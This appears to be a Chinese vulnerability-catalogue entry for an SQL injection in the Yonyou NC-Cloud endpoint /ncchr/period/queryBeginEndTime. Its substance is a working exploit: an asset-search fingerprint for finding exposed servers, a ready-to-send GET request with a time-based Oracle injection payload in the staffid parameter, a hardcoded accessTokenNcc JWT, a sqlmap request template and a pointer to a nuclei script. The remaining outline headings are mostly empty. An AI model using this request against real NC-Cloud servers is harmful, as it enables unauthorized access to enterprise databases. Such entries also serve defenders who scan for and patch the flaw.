# 用友NC-Cloud系统queryBeginEndTime存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`GET /ncchr/period/queryBeginEndTime?staffid=1%3F'%20and%204431%3Ddbms_pipe.receive_message(chr(83)%7C%7Cchr(104)%7C%7Cchr(82)%7C%7Cchr(70)%2C3)-- HTTP/1.1`
- **关键头**：`Host: {hostname}`　`accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ`

**请求体 / payload**
```

sqlmap
GET /ncchr/period/queryBeginEndTime?staffid=1 HTTP/1.1
Host: {hostname}
accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ

nuclei脚本\
\[用友-nc-cloud-querybeginendtime-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友NC-Cloud系统queryBeginEndTime存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC Cloud